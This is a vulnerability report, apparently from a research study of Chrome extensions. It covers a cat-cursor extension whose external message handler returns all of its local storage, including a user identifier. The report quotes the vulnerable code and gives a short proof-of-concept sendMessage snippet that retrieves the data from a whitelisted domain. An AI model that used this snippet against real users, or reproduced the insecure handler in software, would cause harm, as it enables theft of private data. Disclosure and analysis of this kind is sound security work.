# CoCo Analysis: ekiejpimpidhnjebfecllpnpiphndggn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both are the same vulnerability)

---

## Sink: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ekiejpimpidhnjebfecllpnpiphndggn/opgen_generated_files/bg.js
Line 751-752 (framework code reference)

Actual vulnerability found in original extension code at Line 1093-1114.

**Code:**

```javascript
// Background script (bg.js) - Line 1093
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
    switch (request.action) { // ← attacker-controlled
        case "add": {
            chrome.storage.local.get('cats', (data) => {
                let x = data.cats.find(i => i.id === request.data.id)
                if(!x){
                    data.cats.push(request.data);
                    chrome.storage.local.set({cats: data.cats});
                }
            });
            sendResponse(request.data);
            break
        }
        case "get": {
            // VULNERABILITY: Sends all storage data to external caller
            chrome.storage.local.get((data) => sendResponse({data: data})); // ← all storage leaked
            sendResponse(request.data);
            break
        }
        default:
            break;
    }
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted domain in manifest.json externally_connectable:
// *://*.cursorcats.com/*, *://*.catcursor.com/*, *://*.cursor-cat.com/*
chrome.runtime.sendMessage(
    "ekiejpimpidhnjebfecllpnpiphndggn",
    {action: "get"},
    (response) => {
        console.log("Stolen storage data:", response.data);
        // response.data contains all extension storage including:
        // - dateInstalled, dateUpdated
        // - user cats configuration
        // - uid (user identifier)
        // - active cat settings
    }
);
```

**Impact:** Information disclosure vulnerability. Any website matching the externally_connectable patterns can retrieve all extension storage data including user identifier (uid), installation dates, and user configuration. While the methodology states to ignore manifest restrictions, this extension explicitly allows external messages from specific domains through externally_connectable, making this a clear vulnerability where whitelisted domains can exfiltrate all stored user data.
